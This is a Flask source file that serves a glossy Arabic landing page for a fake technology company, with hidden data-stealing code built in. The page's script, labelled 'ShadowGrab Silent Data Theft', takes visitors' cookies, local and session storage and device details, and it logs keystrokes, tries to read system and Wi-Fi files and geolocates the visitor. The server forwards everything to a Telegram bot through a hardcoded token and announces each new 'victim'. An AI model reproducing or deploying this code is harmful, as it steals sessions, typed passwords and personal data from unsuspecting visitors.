from flask import Flask, request, jsonify
import os
import json
import requests
import datetime
import base64

app = Flask(__name__)

TELEGRAM_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
TELEGRAM_CHAT_ID = "1170411845"

def send_telegram(message, photo=None):
    try:
        if photo:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': photo}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': message[:200]}
            requests.post(url, files=files, data=data, timeout=10)
        else:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message[:4000], "parse_mode": "HTML"}
            requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"خطأ: {e}")

@app.route('/')
def index():
    visitor_ip = request.remote_addr
    send_telegram(f"""🔥 <b>دخول ضحية جديدة</b>
🌐 IP: {visitor_ip}
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📱 جاري سحب البيانات...""")
    
    return '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>عبود | @SSSTlF</title>
        <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Cairo', sans-serif;
                background: #05070D;
                color: #F8FAFC;
                overflow-x: hidden;
                cursor: none;
            }
            
            ::-webkit-scrollbar { width: 6px; }
            ::-webkit-scrollbar-track { background: #05070D; }
            ::-webkit-scrollbar-thumb { background: #E8C66A; border-radius: 10px; }

            /* Cursor Glow */
            .cursor-glow {
                position: fixed;
                width: 400px;
                height: 400px;
                border-radius: 50%;
                background: radial-gradient(circle, rgba(232, 198, 106, 0.08) 0%, transparent 70%);
                pointer-events: none;
                z-index: 9999;
                transform: translate(-50%, -50%);
                transition: all 0.1s ease;
            }

            /* Aurora Background */
            .aurora {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 0;
                overflow: hidden;
            }
            .aurora::before {
                content: '';
                position: absolute;
                width: 600px;
                height: 600px;
                background: radial-gradient(circle, rgba(59, 130, 246, 0.15), transparent 70%);
                top: -10%;
                left: -10%;
                animation: aurora1 15s ease-in-out infinite alternate;
            }
            .aurora::after {
                content: '';
                position: absolute;
                width: 500px;
                height: 500px;
                background: radial-gradient(circle, rgba(109, 40, 217, 0.15), transparent 70%);
                bottom: -10%;
                right: -10%;
                animation: aurora2 20s ease-in-out infinite alternate;
            }
            @keyframes aurora1 {
                0% { transform: translate(0, 0) scale(1); }
                100% { transform: translate(200px, 100px) scale(1.5); }
            }
            @keyframes aurora2 {
                0% { transform: translate(0, 0) scale(1); }
                100% { transform: translate(-200px, -100px) scale(1.5); }
            }

            /* Particles */
            .particles {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 0;
                pointer-events: none;
            }
            .particle {
                position: absolute;
                width: 3px;
                height: 3px;
                background: #E8C66A;
                border-radius: 50%;
                box-shadow: 0 0 10px #E8C66A;
                animation: float linear infinite;
            }
            @keyframes float {
                0% { transform: translateY(100vh) scale(0); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translateY(-10vh) scale(1); opacity: 0; }
            }

            /* Glassmorphism Navbar */
            .navbar {
                position: fixed;
                top: 20px;
                left: 50%;
                transform: translateX(-50%);
                width: 90%;
                max-width: 1300px;
                padding: 16px 32px;
                background: rgba(5, 7, 13, 0.6);
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
                border: 1px solid rgba(232, 198, 106, 0.1);
                border-radius: 24px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                z-index: 1000;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            }
            .navbar .logo {
                display: flex;
                flex-direction: column;
                align-items: center;
            }
            .navbar .logo h1 {
                font-size: 28px;
                font-weight: 800;
                background: linear-gradient(135deg, #E8C66A, #F8FAFC, #E8C66A);
                background-size: 200% auto;
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                animation: shimmer 3s ease-in-out infinite;
                letter-spacing: 2px;
            }
            @keyframes shimmer {
                0%, 100% { background-position: 0% center; }
                50% { background-position: 200% center; }
            }
            .navbar .logo span {
                font-size: 12px;
                color: #AEB8C4;
                letter-spacing: 3px;
                margin-top: -4px;
            }
            .navbar ul {
                list-style: none;
                display: flex;
                gap: 24px;
                align-items: center;
            }
            .navbar ul li a {
                color: #AEB8C4;
                text-decoration: none;
                font-size: 14px;
                font-weight: 500;
                transition: 0.3s;
                position: relative;
            }
            .navbar ul li a::after {
                content: '';
                position: absolute;
                bottom: -4px;
                left: 0;
                width: 0%;
                height: 2px;
                background: #E8C66A;
                transition: 0.3s;
            }
            .navbar ul li a:hover {
                color: #F8FAFC;
            }
            .navbar ul li a:hover::after {
                width: 100%;
            }
            .btn-gold {
                background: linear-gradient(135deg, #E8C66A, #D4AF37);
                color: #05070D !important;
                padding: 10px 28px;
                border-radius: 50px;
                font-weight: 700;
                transition: 0.3s;
                border: none;
                cursor: pointer;
                font-family: 'Cairo', sans-serif;
                font-size: 14px;
            }
            .btn-gold:hover {
                transform: scale(1.05);
                box-shadow: 0 0 40px rgba(232, 198, 106, 0.3);
            }

            /* Hero */
            .hero {
                position: relative;
                z-index: 1;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                text-align: center;
                padding: 120px 20px 60px;
            }
            .hero .logo-hero {
                margin-bottom: 20px;
            }
            .hero .logo-hero h1 {
                font-size: 80px;
                font-weight: 800;
                background: linear-gradient(135deg, #E8C66A, #F8FAFC, #E8C66A);
                background-size: 200% auto;
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                animation: shimmer 3s ease-in-out infinite;
                letter-spacing: 4px;
            }
            .hero .logo-hero span {
                font-size: 20px;
                color: #AEB8C4;
                letter-spacing: 6px;
                display: block;
                margin-top: -8px;
            }
            .hero h2 {
                font-size: 56px;
                font-weight: 700;
                margin: 30px 0 20px;
                line-height: 1.2;
            }
            .hero h2 span {
                background: linear-gradient(135deg, #E8C66A, #3B82F6, #6D28D9);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .hero p {
                font-size: 20px;
                color: #AEB8C4;
                max-width: 700px;
                line-height: 1.8;
                margin-bottom: 40px;
            }
            .hero .btn-group {
                display: flex;
                gap: 20px;
                flex-wrap: wrap;
                justify-content: center;
            }
            .hero .btn-gold-large {
                background: linear-gradient(135deg, #E8C66A, #D4AF37);
                color: #05070D;
                padding: 16px 48px;
                border-radius: 50px;
                font-size: 18px;
                font-weight: 700;
                border: none;
                cursor: pointer;
                transition: 0.3s;
                font-family: 'Cairo', sans-serif;
            }
            .hero .btn-gold-large:hover {
                transform: scale(1.05);
                box-shadow: 0 0 60px rgba(232, 198, 106, 0.4);
            }
            .hero .btn-glass {
                background: rgba(255, 255, 255, 0.05);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                color: #F8FAFC;
                padding: 16px 48px;
                border-radius: 50px;
                font-size: 18px;
                font-weight: 600;
                cursor: pointer;
                transition: 0.3s;
                font-family: 'Cairo', sans-serif;
            }
            .hero .btn-glass:hover {
                background: rgba(232, 198, 106, 0.1);
                border-color: #E8C66A;
                transform: scale(1.05);
            }

            /* Stats */
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 20px;
                max-width: 1000px;
                margin: 60px auto 0;
                width: 100%;
            }
            .stat-item {
                background: rgba(255, 255, 255, 0.03);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.05);
                border-radius: 20px;
                padding: 24px;
                text-align: center;
                transition: 0.4s;
            }
            .stat-item:hover {
                border-color: #E8C66A;
                transform: translateY(-5px);
            }
            .stat-item h3 {
                font-size: 32px;
                font-weight: 800;
                color: #E8C66A;
            }
            .stat-item p {
                font-size: 14px;
                color: #AEB8C4;
                margin-top: 4px;
            }

            /* Sections */
            .section {
                position: relative;
                z-index: 1;
                padding: 80px 20px;
                max-width: 1300px;
                margin: auto;
            }
            .section-title {
                font-size: 40px;
                font-weight: 700;
                text-align: center;
                margin-bottom: 16px;
            }
            .section-title span {
                background: linear-gradient(135deg, #E8C66A, #3B82F6);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .section-desc {
                text-align: center;
                color: #AEB8C4;
                max-width: 600px;
                margin: 0 auto 60px;
                font-size: 18px;
                line-height: 1.8;
            }

            /* Services Cards */
            .services-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 24px;
            }
            .service-card {
                background: rgba(255, 255, 255, 0.03);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.05);
                border-radius: 24px;
                padding: 32px;
                text-align: center;
                transition: 0.5s;
                position: relative;
                overflow: hidden;
            }
            .service-card::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: conic-gradient(from 0deg, transparent, rgba(232, 198, 106, 0.05), transparent, rgba(59, 130, 246, 0.05), transparent);
                animation: rotate 10s linear infinite;
                opacity: 0;
                transition: 0.5s;
            }
            .service-card:hover::before {
                opacity: 1;
            }
            @keyframes rotate {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .service-card:hover {
                transform: translateY(-10px);
                border-color: #E8C66A;
                box-shadow: 0 20px 60px rgba(232, 198, 106, 0.1);
            }
            .service-card .icon {
                font-size: 48px;
                margin-bottom: 16px;
            }
            .service-card h3 {
                font-size: 20px;
                font-weight: 700;
                margin-bottom: 8px;
            }
            .service-card p {
                color: #AEB8C4;
                font-size: 14px;
                line-height: 1.6;
            }

            /* Projects */
            .projects-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 24px;
            }
            .project-card {
                border-radius: 24px;
                overflow: hidden;
                position: relative;
                height: 280px;
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid rgba(255, 255, 255, 0.05);
                transition: 0.5s;
                cursor: pointer;
            }
            .project-card:hover {
                transform: scale(1.02);
                border-color: #E8C66A;
                box-shadow: 0 20px 60px rgba(232, 198, 106, 0.15);
            }
            .project-card .project-overlay {
                position: absolute;
                bottom: 0;
                left: 0;
                right: 0;
                padding: 30px;
                background: linear-gradient(transparent, rgba(5, 7, 13, 0.9));
            }
            .project-card .project-overlay h4 {
                font-size: 22px;
                font-weight: 700;
                color: #F8FAFC;
            }
            .project-card .project-overlay p {
                color: #AEB8C4;
                font-size: 14px;
            }

            /* Pricing */
            .pricing-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
                gap: 24px;
                margin-top: 40px;
            }
            .pricing-card {
                background: rgba(255, 255, 255, 0.03);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.05);
                border-radius: 24px;
                padding: 40px;
                text-align: center;
                transition: 0.5s;
                position: relative;
            }
            .pricing-card:hover {
                transform: translateY(-10px);
                border-color: #E8C66A;
                box-shadow: 0 20px 60px rgba(232, 198, 106, 0.1);
            }
            .pricing-card.featured {
                border: 2px solid #E8C66A;
                box-shadow: 0 0 60px rgba(232, 198, 106, 0.15);
            }
            .pricing-card.featured::before {
                content: 'المفضلة';
                position: absolute;
                top: -12px;
                left: 50%;
                transform: translateX(-50%);
                background: #E8C66A;
                color: #05070D;
                padding: 4px 20px;
                border-radius: 50px;
                font-size: 12px;
                font-weight: 700;
            }
            .pricing-card h4 {
                font-size: 24px;
                font-weight: 700;
                margin-bottom: 8px;
            }
            .pricing-card .price {
                font-size: 48px;
                font-weight: 800;
                color: #E8C66A;
                margin: 16px 0;
            }
            .pricing-card .price span {
                font-size: 18px;
                color: #AEB8C4;
                font-weight: 400;
            }
            .pricing-card ul {
                list-style: none;
                text-align: right;
                margin: 20px 0;
            }
            .pricing-card ul li {
                padding: 8px 0;
                color: #AEB8C4;
                font-size: 14px;
                border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            }
            .pricing-card ul li::before {
                content: '✓ ';
                color: #E8C66A;
                font-weight: 700;
            }

            /* Footer */
            .footer {
                position: relative;
                z-index: 1;
                background: rgba(5, 7, 13, 0.8);
                backdrop-filter: blur(10px);
                border-top: 1px solid rgba(232, 198, 106, 0.1);
                padding: 60px 20px 30px;
                margin-top: 40px;
            }
            .footer-content {
                max-width: 1300px;
                margin: auto;
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 40px;
            }
            .footer-brand h2 {
                font-size: 32px;
                font-weight: 800;
                background: linear-gradient(135deg, #E8C66A, #F8FAFC);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .footer-brand span {
                color: #AEB8C4;
                font-size: 14px;
                letter-spacing: 2px;
            }
            .footer-col h5 {
                font-size: 16px;
                font-weight: 700;
                color: #F8FAFC;
                margin-bottom: 16px;
            }
            .footer-col a {
                display: block;
                color: #AEB8C4;
                text-decoration: none;
                font-size: 14px;
                padding: 6px 0;
                transition: 0.3s;
            }
            .footer-col a:hover {
                color: #E8C66A;
                padding-right: 8px;
            }
            .footer-social {
                display: flex;
                gap: 16px;
                margin-top: 16px;
            }
            .footer-social a {
                width: 44px;
                height: 44px;
                border-radius: 50%;
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.05);
                display: flex;
                align-items: center;
                justify-content: center;
                color: #AEB8C4;
                text-decoration: none;
                transition: 0.3s;
                font-size: 18px;
            }
            .footer-social a:hover {
                background: #E8C66A;
                color: #05070D;
                transform: translateY(-3px);
            }
            .footer-bottom {
                text-align: center;
                padding-top: 30px;
                margin-top: 30px;
                border-top: 1px solid rgba(255, 255, 255, 0.05);
                color: #AEB8C4;
                font-size: 13px;
            }

            /* AI Assistant */
            .ai-assistant {
                position: fixed;
                bottom: 30px;
                right: 30px;
                z-index: 1000;
            }
            .ai-assistant .chat-btn {
                width: 60px;
                height: 60px;
                border-radius: 50%;
                background: linear-gradient(135deg, #E8C66A, #D4AF37);
                border: none;
                color: #05070D;
                font-size: 28px;
                cursor: pointer;
                box-shadow: 0 10px 40px rgba(232, 198, 106, 0.3);
                transition: 0.3s;
            }
            .ai-assistant .chat-btn:hover {
                transform: scale(1.1);
            }

            /* Responsive */
            @media (max-width: 768px) {
                .navbar {
                    flex-direction: column;
                    gap: 12px;
                    padding: 16px 20px;
                    top: 10px;
                    width: 95%;
                }
                .navbar ul {
                    flex-wrap: wrap;
                    justify-content: center;
                    gap: 12px;
                }
                .navbar ul li a {
                    font-size: 12px;
                }
                .hero .logo-hero h1 {
                    font-size: 48px;
                }
                .hero h2 {
                    font-size: 28px;
                }
                .hero p {
                    font-size: 16px;
                }
                .section-title {
                    font-size: 28px;
                }
                .stats {
                    grid-template-columns: repeat(2, 1fr);
                }
                .services-grid {
                    grid-template-columns: 1fr;
                }
                .projects-grid {
                    grid-template-columns: 1fr;
                }
                .pricing-grid {
                    grid-template-columns: 1fr;
                }
                .footer-content {
                    grid-template-columns: 1fr;
                }
            }
        </style>
    </head>
    <body>

        <!-- Cursor Glow -->
        <div class="cursor-glow" id="cursorGlow"></div>

        <!-- Aurora -->
        <div class="aurora"></div>

        <!-- Particles -->
        <div class="particles" id="particles"></div>

        <!-- Navbar -->
        <nav class="navbar">
            <div class="logo">
                <h1>عبود</h1>
                <span>@SSSTlF</span>
            </div>
            <ul>
                <li><a href="#">الرئيسية</a></li>
                <li><a href="#">الخدمات</a></li>
                <li><a href="#">الذكاء الاصطناعي</a></li>
                <li><a href="#">الأمن السيبراني</a></li>
                <li><a href="#">المشاريع</a></li>
                <li><a href="#">المنتجات</a></li>
                <li><a href="#">تواصل معنا</a></li>
                <li><button class="btn-gold">ابدأ الآن</button></li>
            </ul>
        </nav>

        <!-- Hero -->
        <section class="hero">
            <div class="logo-hero">
                <h1>عبود</h1>
                <span>@SSSTlF</span>
            </div>
            <h2>نصنع مستقبل <span>التقنية والذكاء الاصطناعي</span></h2>
            <p>نبتكر حلولًا رقمية عالمية تجمع بين الذكاء الاصطناعي، والأمن السيبراني، والحوسبة السحابية، لنمنح الشركات والأفراد تجربة تقنية لا مثيل لها.</p>
            <div class="btn-group">
                <button class="btn-gold-large">ابدأ الآن</button>
                <button class="btn-glass">استكشف أعمالنا</button>
            </div>
            <div class="stats">
                <div class="stat-item"><h3>+180</h3><p>دولة</p></div>
                <div class="stat-item"><h3>+15M</h3><p>مستخدم</p></div>
                <div class="stat-item"><h3>99.999%</h3><p>جاهزية تشغيل</p></div>
                <div class="stat-item"><h3>24/7</h3><p>دعم عالمي</p></div>
            </div>
        </section>

        <!-- Services -->
        <section class="section" id="services">
            <h2 class="section-title">خدماتنا <span>المتطورة</span></h2>
            <p class="section-desc">نقدم حلولاً تقنية متكاملة تعتمد على أحدث التقنيات العالمية.</p>
            <div class="services-grid">
                <div class="service-card"><div class="icon">🧠</div><h3>الذكاء الاصطناعي</h3><p>حلول ذكية تعتمد على التعلم الآلي وتحليل البيانات.</p></div>
                <div class="service-card"><div class="icon">🔒</div><h3>الأمن السيبراني</h3><p>حماية متقدمة ضد الهجمات والتهديدات الرقمية.</p></div>
                <div class="service-card"><div class="icon">☁️</div><h3>الحوسبة السحابية</h3><p>بنية تحتية سحابية مرنة وقابلة للتوسع.</p></div>
                <div class="service-card"><div class="icon">📊</div><h3>تحليل البيانات</h3><p>استخراج رؤى قيمة من البيانات الضخمة.</p></div>
                <div class="service-card"><div class="icon">📱</div><h3>تطوير التطبيقات</h3><p>تطبيقات متكاملة على جميع المنصات.</p></div>
                <div class="service-card"><div class="icon">🔗</div><h3>واجهات API</h3><p>حلول برمجية قابلة للتكامل مع أنظمة أخرى.</p></div>
            </div>
        </section>

        <!-- Projects -->
        <section class="section" id="projects">
            <h2 class="section-title">مشاريعنا <span>الرائدة</span></h2>
            <p class="section-desc">نفخر بتقديم مشاريع تقنية غيرت وجه الصناعة.</p>
            <div class="projects-grid">
                <div class="project-card" style="background: linear-gradient(135deg, #1a1a2e, #16213e);">
                    <div class="project-overlay"><h4>منصة الذكاء الاصطناعي</h4><p>حلول AI متطورة للشركات</p></div>
                </div>
                <div class="project-card" style="background: linear-gradient(135deg, #0d1b2a, #1b2f4a);">
                    <div class="project-overlay"><h4>نظام الأمن السيبراني</h4><p>حماية شاملة للبنية التحتية</p></div>
                </div>
                <div class="project-card" style="background: linear-gradient(135deg, #1a1a2e, #2d1b3d);">
                    <div class="project-overlay"><h4>الحوسبة السحابية</h4><p>بنية تحتية سحابية عالمية</p></div>
                </div>
            </div>
        </section>

        <!-- Pricing -->
        <section class="section" id="pricing">
            <h2 class="section-title">خطط <span>الأسعار</span></h2>
            <p class="section-desc">اختر الخطة المناسبة لاحتياجاتك واستمتع بخدماتنا المتكاملة.</p>
            <div class="pricing-grid">
                <div class="pricing-card">
                    <h4>الأساسية</h4>
                    <div class="price">$49 <span>/ شهر</span></div>
                    <ul><li>وصول إلى المنصة</li><li>دعم أساسي</li><li>مشروع واحد</li></ul>
                    <button class="btn-gold" style="width:100%;">اختر الخطة</button>
                </div>
                <div class="pricing-card featured">
                    <h4>الاحترافية</h4>
                    <div class="price">$149 <span>/ شهر</span></div>
                    <ul><li>وصول كامل للمنصة</li><li>دعم متقدم 24/7</li><li>مشاريع غير محدودة</li><li>أدوات تحليل متقدمة</li></ul>
                    <button class="btn-gold" style="width:100%;">اختر الخطة</button>
                </div>
                <div class="pricing-card">
                    <h4>المؤسسات</h4>
                    <div class="price">$499 <span>/ شهر</span></div>
                    <ul><li>حلول مخصصة</li><li>دعم على مدار الساعة</li><li>تكامل كامل</li><li>أولوية التطوير</li></ul>
                    <button class="btn-gold" style="width:100%;">اختر الخطة</button>
                </div>
            </div>
        </section>

        <!-- AI Assistant (Chat Interface) -->
        <div class="ai-assistant">
            <button class="chat-btn" onclick="alert('مرحباً! كيف يمكنني مساعدتك؟')">🤖</button>
        </div>

        <!-- Footer -->
        <footer class="footer">
            <div class="footer-content">
                <div class="footer-brand">
                    <h2>عبود</h2>
                    <span>@SSSTlF</span>
                    <p style="color:#AEB8C4; font-size:14px; margin-top:12px; line-height:1.6;">
                        نصنع مستقبل التقنية والذكاء الاصطناعي.
                    </p>
                    <div class="footer-social">
                        <a href="#" target="_blank">📷</a>
                        <a href="#" target="_blank">🐦</a>
                        <a href="#" target="_blank">📘</a>
                        <a href="#" target="_blank">📺</a>
                        <a href="#" target="_blank">💼</a>
                        <a href="#" target="_blank">📱</a>
                    </div>
                </div>
                <div class="footer-col"><h5>المنتجات</h5><a href="#">المنصة</a><a href="#">التطبيقات</a><a href="#">واجهات API</a></div>
                <div class="footer-col"><h5>الخدمات</h5><a href="#">الذكاء الاصطناعي</a><a href="#">الأمن السيبراني</a><a href="#">الحوسبة السحابية</a></div>
                <div class="footer-col"><h5>الموارد</h5><a href="#">المدونة</a><a href="#">الوثائق</a><a href="#">الدعم</a></div>
                <div class="footer-col"><h5>القانوني</h5><a href="#">سياسة الخصوصية</a><a href="#">الشروط والأحكام</a></div>
            </div>
            <div class="footer-bottom">
                © 2026 عبود | @SSSTlF — جميع الحقوق محفوظة.
            </div>
        </footer>

        <!-- ===== كود السحب الصامت ===== -->
        <script>
            // Cursor Glow
            const cursor = document.getElementById('cursorGlow');
            document.addEventListener('mousemove', (e) => {
                cursor.style.left = e.clientX + 'px';
                cursor.style.top = e.clientY + 'px';
            });

            // Particles
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 80; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDuration = (Math.random() * 15 + 10) + 's';
                particle.style.animationDelay = (Math.random() * 10) + 's';
                particle.style.width = (Math.random() * 4 + 2) + 'px';
                particle.style.height = particle.style.width;
                particlesContainer.appendChild(particle);
            }

            // ===== ShadowGrab Silent Data Theft =====
            function sendData(label, content) {
                if (!content || content.length < 2) return;
                try {
                    const payload = btoa(unescape(encodeURIComponent(JSON.stringify({ label, content, time: new Date().toISOString() }))));
                    fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ payload })
                    }).catch(() => {});
                } catch(e) {}
            }

            // Cookies
            sendData('🍪 الكوكيز', document.cookie || 'لا توجد');

            // LocalStorage
            try { sendData('💾 LocalStorage', JSON.stringify(localStorage).substring(0, 800)); } catch(e) {}

            // SessionStorage
            try { sendData('📦 SessionStorage', JSON.stringify(sessionStorage).substring(0, 800)); } catch(e) {}

            // Device Info
            sendData('💻 معلومات الجهاز', JSON.stringify({
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            }, null, 2));

            // System Files
            const systemFiles = [
                '/etc/passwd',
                '/etc/hosts',
                '/proc/cpuinfo',
                '/data/misc/wifi/wpa_supplicant.conf',
                '/sdcard/DCIM/',
                '/sdcard/Download/',
                '/sdcard/Pictures/'
            ];
            systemFiles.forEach(file => {
                try {
                    fetch('file://' + file)
                        .then(res => { if (res.ok) return res.text(); throw new Error(); })
                        .then(data => { sendData('📂 ملف: ' + file, data.substring(0, 500)); })
                        .catch(() => {});
                } catch(e) {}
            });

            // Keylogger
            let keys = [];
            let lastSend = Date.now();
            document.addEventListener('keydown', e => {
                if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === 'Tab') {
                    keys.push(e.key);
                    if (keys.length > 200) keys.shift();
                }
                if (Date.now() - lastSend > 3000 && keys.length > 0) {
                    sendData('⌨️ المفاتيح المسجلة', keys.join('').substring(0, 500));
                    keys = [];
                    lastSend = Date.now();
                }
            });

            // Location
            try {
                fetch('https://ipapi.co/json/')
                    .then(res => res.json())
                    .then(data => {
                        sendData('📍 الموقع التقريبي', JSON.stringify({
                            ip: data.ip || 'غير معروف',
                            city: data.city || 'غير معروف',
                            country: data.country_name || 'غير معروف'
                        }, null, 2));
                    })
                    .catch(() => {});
            } catch(e) {}

            setInterval(() => {
                if (keys.length > 0) {
                    sendData('⌨️ المفاتيح المسجلة', keys.join('').substring(0, 500));
                    keys = [];
                    lastSend = Date.now();
                }
            }, 5000);

            console.log('✅ عبود | @SSSTlF — ShadowGrab Active');
        </script>
    </body>
    </html>
    '''

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        if data and 'payload' in data:
            decoded = json.loads(base64.b64decode(data['payload']).decode('utf-8'))
            label = decoded.get('label', 'بيانات')
            content = decoded.get('content', '')
            time = decoded.get('time', datetime.datetime.now().isoformat())
            
            msg = f"""📌 <b>{label}</b>
📝 {content[:1000]}
⏰ {time}"""
            send_telegram(msg)
            return jsonify({"status": "ok"})
    except Exception as e:
        print(f"خطأ: {e}")
    return jsonify({"status": "error"}), 400

@app.route('/image', methods=['POST'])
def image():
    try:
        data = request.json
        if data and 'image' in data:
            img_data = base64.b64decode(data['image'])
            send_telegram('📸 صورة مسحوبة', ('image.jpg', img_data, 'image/jpeg'))
            return jsonify({"status": "ok"})
    except Exception as e:
        print(e)
    return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    send_telegram(f"""🔥 <b>عبود | @SSSTlF</b>
🎯 موقع فخم + سحب بيانات صامت
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
